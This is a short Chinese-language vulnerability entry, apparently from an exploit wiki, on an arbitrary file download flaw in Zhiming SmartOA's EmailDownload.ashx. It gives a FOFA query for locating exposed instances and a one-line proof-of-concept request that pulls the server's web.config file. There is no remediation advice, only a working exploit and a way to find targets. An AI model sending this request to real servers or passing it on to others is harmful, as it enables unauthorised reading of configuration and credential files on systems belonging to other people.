# 智明 SmartOA EmailDownload.ashx 任意文件下载漏洞

## 漏洞描述

智明 SmartOA EmailDownload.ashx文件存在任意文件下载漏洞，通过漏洞可下载服务器上的敏感文件，查看敏感信息

## 漏洞影响

<a-checkbox checked>智明 SmartOA</a-checkbox></br>

## 网络测绘

<a-checkbox checked>app="智明协同-SmartOA"</a-checkbox></br>

## 漏洞复现

登录页面

![img](../../../.vuepress/public/img/1631326538226-96c43380-0494-47e1-899c-7e115530b1bb.png)

验证POC

```python
/file/EmailDownload.ashx?url=~/web.config&name=web.config
```

![img](../../../.vuepress/public/img/1631326793699-a63d3321-beee-4241-9369-2e3ccb9ac39f.png)